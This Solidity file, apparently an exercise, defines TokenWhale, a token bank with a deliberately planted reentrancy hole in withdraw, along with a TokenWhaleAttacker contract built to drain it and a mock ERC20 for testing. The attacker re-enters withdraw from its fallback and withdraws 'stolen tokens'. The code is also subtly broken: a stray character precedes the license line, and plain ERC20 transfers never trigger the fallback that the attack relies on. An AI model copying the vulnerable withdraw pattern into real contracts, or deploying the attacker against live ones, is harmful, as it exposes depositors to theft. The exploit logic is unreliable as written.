a// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title IToken
 * @dev Interface for ERC20 token functions we need
 */
interface IToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

/**
 * @title TokenWhale
 * @dev A token bank contract with a reentrancy vulnerability
 * Users can deposit tokens and withdraw them, but the withdraw function
 * is vulnerable to reentrancy attacks
 */
contract TokenWhale {
    // Mapping from token address => user address => balance
    mapping(address => mapping(address => uint256)) public balances;
    
    // Events
    event Deposited(address indexed user, address indexed token, uint256 amount);
    event Withdrawn(address indexed user, address indexed token, uint256 amount);
    
    /**
     * @dev Deposits tokens into the bank
     * @param token The address of the token to deposit
     * @param amount The amount of tokens to deposit
     */
    function deposit(address token, uint256 amount) external {
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");
        
        // Transfer tokens from user to this contract
        bool success = IToken(token).transferFrom(msg.sender, address(this), amount);
        require(success, "Token transfer failed");
        
        // Update user's balance
        balances[token][msg.sender] += amount;
        
        emit Deposited(msg.sender, token, amount);
    }
    
    /**
     * @dev Withdraws tokens from the bank
     * @param token The address of the token to withdraw
     * @param amount The amount of tokens to withdraw
     * 
     * VULNERABILITY: This function is vulnerable to reentrancy attacks!
     * The state update happens AFTER the external call, allowing an attacker
     * to re-enter and drain funds.
     */
    function withdraw(address token, uint256 amount) external {
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");
        
        uint256 userBalance = balances[token][msg.sender];
        require(userBalance >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state update
        bool success = IToken(token).transfer(msg.sender, amount);
        require(success, "Token transfer failed");
        
        // State update happens AFTER the external call (vulnerable to reentrancy)
        balances[token][msg.sender] -= amount;
        
        emit Withdrawn(msg.sender, token, amount);
    }
    
    /**
     * @dev Returns the balance of a user for a specific token
     * @param token The address of the token
     * @param user The address of the user
     * @return The user's balance of the specified token
     */
    function getBalance(address token, address user) external view returns (uint256) {
        return balances[token][user];
    }
    
    /**
     * @dev Returns the total balance of a specific token held by the bank
     * @param token The address of the token
     * @return The total balance of the token in the bank
     */
    function getTotalBalance(address token) external view returns (uint256) {
        return IToken(token).balanceOf(address(this));
    }
}

/**
 * @title TokenWhaleAttacker
 * @dev Contract designed to exploit the reentrancy vulnerability in TokenWhale
 */
contract TokenWhaleAttacker {
    TokenWhale public tokenWhale;
    address public targetToken;
    bool private attacking;
    
    constructor(address _tokenWhale, address _targetToken) {
        tokenWhale = TokenWhale(_tokenWhale);
        targetToken = _targetToken;
    }
    
    /**
     * @dev Initiates the attack by depositing tokens and then withdrawing
     * @param attackAmount The amount of tokens to use for the attack
     */
    function attack(uint256 attackAmount) external {
        require(attackAmount > 0, "Attack amount must be greater than 0");
        
        // Transfer tokens from attacker to this contract
        bool success = IToken(targetToken).transferFrom(msg.sender, address(this), attackAmount);
        require(success, "Failed to transfer tokens to attacker contract");
        
        // Approve TokenWhale to spend our tokens
        success = IToken(targetToken).approve(address(tokenWhale), attackAmount);
        require(success, "Failed to approve TokenWhale");
        
        // Deposit tokens into TokenWhale
        tokenWhale.deposit(targetToken, attackAmount);
        
        // Start the reentrancy attack
        attacking = true;
        tokenWhale.withdraw(targetToken, attackAmount);
        attacking = false;
    }
    
    /**
     * @dev Fallback function that gets called when tokens are transferred to this contract
     * This is where the reentrancy attack happens
     */
    fallback() external {
        if (attacking) {
            // Check if TokenWhale still has tokens
            uint256 whaleBalance = tokenWhale.getTotalBalance(targetToken);
            uint256 myBalance = tokenWhale.getBalance(targetToken, address(this));
            
            if (whaleBalance > 0 && myBalance > 0) {
                // Re-enter the withdraw function before the state is updated
                tokenWhale.withdraw(targetToken, myBalance);
            }
        }
    }
    
    /**
     * @dev Receive function for plain ETH transfers
     */
    receive() external payable {
        // Same logic as fallback
        if (attacking) {
            uint256 whaleBalance = tokenWhale.getTotalBalance(targetToken);
            uint256 myBalance = tokenWhale.getBalance(targetToken, address(this));
            
            if (whaleBalance > 0 && myBalance > 0) {
                tokenWhale.withdraw(targetToken, myBalance);
            }
        }
    }
    
    /**
     * @dev Allows the attacker to withdraw stolen tokens
     */
    function withdrawStolenTokens() external {
        uint256 balance = IToken(targetToken).balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        
        bool success = IToken(targetToken).transfer(msg.sender, balance);
        require(success, "Failed to transfer stolen tokens");
    }
    
    /**
     * @dev Get the current balance of this contract
     */
    function getContractBalance() external view returns (uint256) {
        return IToken(targetToken).balanceOf(address(this));
    }
}

/**
 * @title MockToken
 * @dev A simple ERC20 token for testing the attack
 */
contract MockToken {
    string public name = "Mock Token";
    string public symbol = "MTK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(uint256 _totalSupply) {
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        
        emit Transfer(from, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}

